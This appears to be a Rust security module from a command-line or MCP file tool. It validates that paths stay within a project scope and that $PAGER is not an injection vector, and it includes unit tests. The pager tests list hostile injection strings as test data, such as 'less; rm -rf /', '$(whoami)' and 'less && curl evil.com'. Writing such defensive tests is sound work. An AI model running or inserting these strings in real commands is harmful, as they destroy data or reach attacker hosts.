use std::path::{Path, PathBuf};

use crate::error::TilthError;

// Shell metacharacters that could enable command injection
const SHELL_META: &[char] = &['|', '&', ';', '$', '`', '(', ')', '<', '>', '\n', '\r'];

/// Validate that a path is within the allowed scope (project root).
/// Prevents path traversal attacks via `../` or absolute paths.
///
/// # Security
/// This is a critical security boundary. All file read/write operations
/// MUST call this before accessing the filesystem.
///
/// # Returns
/// - `Ok(canonicalized_path)` if path is within scope
/// - `Err(TilthError::PathTraversal)` if path escapes scope
pub fn validate_path_in_scope(path: &Path, scope: &Path) -> Result<PathBuf, TilthError> {
    // Canonicalize scope first (must exist)
    let canonical_scope = scope.canonicalize().map_err(|e| TilthError::IoError {
        path: scope.to_path_buf(),
        source: e,
    })?;

    // Resolve the target path
    let resolved = if path.is_absolute() {
        // Absolute paths: canonicalize directly
        path.canonicalize().map_err(|e| match e.kind() {
            std::io::ErrorKind::NotFound => TilthError::NotFound {
                path: path.to_path_buf(),
                suggestion: None,
            },
            std::io::ErrorKind::PermissionDenied => TilthError::PermissionDenied {
                path: path.to_path_buf(),
            },
            _ => TilthError::IoError {
                path: path.to_path_buf(),
                source: e,
            },
        })?
    } else {
        // Relative paths: join with scope first, then canonicalize
        let joined = canonical_scope.join(path);
        joined.canonicalize().map_err(|e| match e.kind() {
            std::io::ErrorKind::NotFound => TilthError::NotFound {
                path: path.to_path_buf(),
                suggestion: None,
            },
            std::io::ErrorKind::PermissionDenied => TilthError::PermissionDenied {
                path: path.to_path_buf(),
            },
            _ => TilthError::IoError {
                path: path.to_path_buf(),
                source: e,
            },
        })?
    };

    // Verify resolved path is within scope
    if !resolved.starts_with(&canonical_scope) {
        return Err(TilthError::PathTraversal {
            path: path.to_path_buf(),
            scope: canonical_scope,
        });
    }

    Ok(resolved)
}

/// Validate path for MCP server operations (no scope — validates against CWD).
/// Used when MCP server doesn't have an explicit scope parameter.
pub fn validate_path_mcp(path: &Path) -> Result<PathBuf, TilthError> {
    let cwd = std::env::current_dir().map_err(|e| TilthError::IoError {
        path: PathBuf::from("."),
        source: e,
    })?;

    validate_path_in_scope(path, &cwd)
}

/// Validate and sanitize $PAGER environment variable.
/// Prevents command injection by ensuring the pager is a safe executable path.
///
/// # Security
/// Only allows known-safe pagers or simple executable names (no shell metacharacters).
/// Returns the validated pager command, falling back to "less" if unsafe.
#[must_use]
pub fn validate_pager(pager: &str) -> String {
    // Allow list of known-safe pagers
    const SAFE_PAGERS: &[&str] = &["less", "more", "most", "bat", "cat"];

    let trimmed = pager.trim();

    // Empty or whitespace-only → fallback
    if trimmed.is_empty() {
        return "less".to_string();
    }

    // Check if it's in the allow list (case-insensitive)
    let lower = trimmed.to_lowercase();
    if SAFE_PAGERS.iter().any(|&p| lower == p) {
        return trimmed.to_string();
    }

    // Check for shell metacharacters that could enable injection
    if trimmed.chars().any(|c| SHELL_META.contains(&c)) {
        eprintln!("warning: unsafe $PAGER value '{trimmed}', using 'less'");
        return "less".to_string();
    }

    // If it contains a path separator, verify it's an absolute path to an executable
    if trimmed.contains('/') {
        let path = std::path::Path::new(trimmed);
        if path.is_absolute() && path.exists() && is_executable(path) {
            return trimmed.to_string();
        }
        eprintln!("warning: $PAGER path '{trimmed}' not found or not executable, using 'less'");
        return "less".to_string();
    }

    // Simple command name without path — allow it (will be resolved via $PATH)
    // Already checked for shell metacharacters above
    trimmed.to_string()
}

/// Check if a path is executable (Unix-only check, no-op on Windows).
#[cfg(unix)]
fn is_executable(path: &std::path::Path) -> bool {
    use std::os::unix::fs::PermissionsExt;
    if let Ok(metadata) = std::fs::metadata(path) {
        let permissions = metadata.permissions();
        permissions.mode() & 0o111 != 0
    } else {
        false
    }
}

#[cfg(not(unix))]
fn is_executable(_path: &std::path::Path) -> bool {
    // On Windows, just check if file exists (all .exe are executable)
    true
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs;

    fn setup_test_dir(name: &str) -> PathBuf {
        let base = std::env::temp_dir().join(format!("tilth_security_test_{name}"));
        let _ = fs::remove_dir_all(&base);
        fs::create_dir_all(&base).unwrap();
        base
    }

    #[test]
    fn test_path_within_scope() {
        let scope = setup_test_dir("within");
        let file = scope.join("test.txt");
        fs::write(&file, "content").unwrap();

        let result = validate_path_in_scope(&file, &scope);
        assert!(result.is_ok(), "valid path should be allowed");

        let _ = fs::remove_dir_all(&scope);
    }

    #[test]
    fn test_path_traversal_blocked() {
        let scope = setup_test_dir("traversal");
        let file = scope.join("test.txt");
        fs::write(&file, "content").unwrap();

        // Create a file outside scope to traverse to
        let outside = scope.parent().unwrap().join("outside_target.txt");
        fs::write(&outside, "secret").unwrap();

        // Try to escape via ../
        let evil_path = scope.join("../outside_target.txt");

        let result = validate_path_in_scope(&evil_path, &scope);
        assert!(
            matches!(result, Err(TilthError::PathTraversal { .. })),
            "path traversal should be blocked, got: {result:?}"
        );

        let _ = fs::remove_file(&outside);
        let _ = fs::remove_dir_all(&scope);
    }

    #[test]
    fn test_absolute_path_outside_scope() {
        let scope = setup_test_dir("absolute");

        // Absolute path to /tmp (outside scope)
        let evil_path = PathBuf::from("/tmp/evil.txt");

        let result = validate_path_in_scope(&evil_path, &scope);
        assert!(
            matches!(result, Err(TilthError::PathTraversal { .. } | TilthError::NotFound { .. })),
            "absolute path outside scope should be blocked"
        );

        let _ = fs::remove_dir_all(&scope);
    }

    #[test]
    fn test_relative_path_within_scope() {
        let scope = setup_test_dir("relative");
        let subdir = scope.join("subdir");
        fs::create_dir(&subdir).unwrap();
        let file = subdir.join("test.txt");
        fs::write(&file, "content").unwrap();

        // Relative path within scope
        let rel_path = PathBuf::from("subdir/test.txt");

        let result = validate_path_in_scope(&rel_path, &scope);
        assert!(
            result.is_ok(),
            "relative path within scope should be allowed"
        );

        let _ = fs::remove_dir_all(&scope);
    }

    #[test]
    fn test_symlink_escape_blocked() {
        let scope = setup_test_dir("symlink");
        let outside = setup_test_dir("symlink_outside");
        let outside_file = outside.join("secret.txt");
        fs::write(&outside_file, "sensitive data").unwrap();

        // Create symlink inside scope pointing outside
        let symlink_path = scope.join("link");
        #[cfg(unix)]
        {
            use std::os::unix::fs::symlink;
            let _ = symlink(&outside_file, &symlink_path);

            let result = validate_path_in_scope(&symlink_path, &scope);
            // Symlinks are canonicalized, so this will resolve to outside path
            assert!(
                matches!(result, Err(TilthError::PathTraversal { .. })),
                "symlink escape should be blocked"
            );
        }

        let _ = fs::remove_dir_all(&scope);
        let _ = fs::remove_dir_all(&outside);
    }

    #[test]
    fn test_nonexistent_path() {
        let scope = setup_test_dir("nonexistent");

        let missing = scope.join("does_not_exist.txt");

        let result = validate_path_in_scope(&missing, &scope);
        assert!(
            matches!(result, Err(TilthError::NotFound { .. })),
            "nonexistent path should return NotFound"
        );

        let _ = fs::remove_dir_all(&scope);
    }

    #[test]
    fn test_mcp_validation_blocks_parent_dir() {
        // Create a temp dir structure:
        // /tmp/tilth_mcp_test/
        // ├── inside.txt
        // └── ../outside.txt  (resolves to /tmp/outside.txt)

        let test_dir = setup_test_dir("mcp_validation");
        let inside_file = test_dir.join("inside.txt");
        fs::write(&inside_file, "inside").unwrap();

        // Change to test_dir as CWD
        let original_dir = std::env::current_dir().unwrap();
        std::env::set_current_dir(&test_dir).unwrap();

        // Try to access parent directory
        let evil_path = PathBuf::from("../outside.txt");

        let result = validate_path_mcp(&evil_path);
        assert!(
            matches!(result, Err(TilthError::PathTraversal { .. } | TilthError::NotFound { .. })),
            "MCP validation should block parent directory access"
        );

        // Restore original directory
        std::env::set_current_dir(&original_dir).unwrap();
        let _ = fs::remove_dir_all(&test_dir);
    }

    #[test]
    fn test_pager_safe_defaults() {
        assert_eq!(validate_pager("less"), "less");
        assert_eq!(validate_pager("more"), "more");
        assert_eq!(validate_pager("bat"), "bat");
        assert_eq!(validate_pager("most"), "most");
    }

    #[test]
    fn test_pager_blocks_shell_metacharacters() {
        // Command injection attempts should fallback to "less"
        assert_eq!(validate_pager("less; rm -rf /"), "less");
        assert_eq!(validate_pager("cat | sh"), "less");
        assert_eq!(validate_pager("$(whoami)"), "less");
        assert_eq!(validate_pager("`id`"), "less");
        assert_eq!(validate_pager("less && curl evil.com"), "less");
        assert_eq!(validate_pager("less\nrm -rf /"), "less");
    }

    #[test]
    fn test_pager_empty_fallback() {
        assert_eq!(validate_pager(""), "less");
        assert_eq!(validate_pager("   "), "less");
    }

    #[test]
    fn test_pager_absolute_path() {
        // Absolute paths should only be allowed if they exist and are executable
        // /usr/bin/less should exist on most Unix systems
        #[cfg(unix)]
        {
            let less_path = "/usr/bin/less";
            if std::path::Path::new(less_path).exists() {
                assert_eq!(validate_pager(less_path), less_path);
            }

            // Non-existent absolute path should fallback
            assert_eq!(validate_pager("/usr/bin/nonexistent_pager"), "less");
        }
    }

    #[test]
    fn test_pager_simple_command_name() {
        // Simple command names without path separators should be allowed
        // (will be resolved via $PATH)
        let pager = validate_pager("moar");
        assert_eq!(pager, "moar", "simple command name should be allowed");

        // But not if it contains shell metacharacters
        assert_eq!(validate_pager("evil;cmd"), "less");
    }

    /// Integration test: verify path validation prevents directory traversal in edit operations.
    /// Uses validate_path_in_scope directly to avoid racy set_current_dir (process-global).
    #[test]
    fn test_integration_edit_path_traversal() {
        let scope = setup_test_dir("integration_edit");
        let file = scope.join("allowed.txt");
        fs::write(&file, "line 1\nline 2\nline 3\n").unwrap();

        // Create a file outside scope
        let outside = scope.parent().unwrap().join("forbidden.txt");
        fs::write(&outside, "secret\n").unwrap();

        // Try to traverse outside scope via ../
        let evil_path = scope.join("../forbidden.txt");
        let validated = validate_path_in_scope(&evil_path, &scope);
        assert!(
            matches!(validated, Err(TilthError::PathTraversal { .. })),
            "path traversal should be blocked: {validated:?}"
        );

        // Verify the outside file was not modified
        let outside_content = fs::read_to_string(&outside).unwrap();
        assert_eq!(outside_content, "secret\n", "outside file should be unchanged");

        // Also verify that a legitimate path within scope works
        let validated_allowed = validate_path_in_scope(&file, &scope);
        assert!(
            validated_allowed.is_ok(),
            "legitimate path should be allowed"
        );

        let _ = fs::remove_file(&outside);
        let _ = fs::remove_dir_all(&scope);
    }
}
